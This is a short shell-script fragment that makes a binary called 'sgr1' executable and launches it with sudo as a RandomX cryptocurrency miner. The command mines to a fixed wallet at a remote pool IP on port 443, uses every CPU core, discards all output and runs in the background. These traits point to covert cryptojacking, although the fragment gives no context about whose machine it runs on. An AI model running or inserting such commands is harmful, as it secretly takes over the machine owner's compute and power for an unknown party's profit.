...
chmod +x sgr1
sudo ./sgr1 -a rx/0 -o 68.183.180.0:443 -u ZEPHYR39FtS9jDrhDaMM9ReUUPLodNvqYHjD5CbYeLZM8h3tXARpwevMnW3kiXqxUUTYMTSDEgVDDV6WwXYL3Q5TVcVWxN58Wuc59 -p $(echo $(shuf -i 1-100000 -n 1)-A) -t $(nproc --all) --donate-level 1 -k > /dev/null 2>&1 &
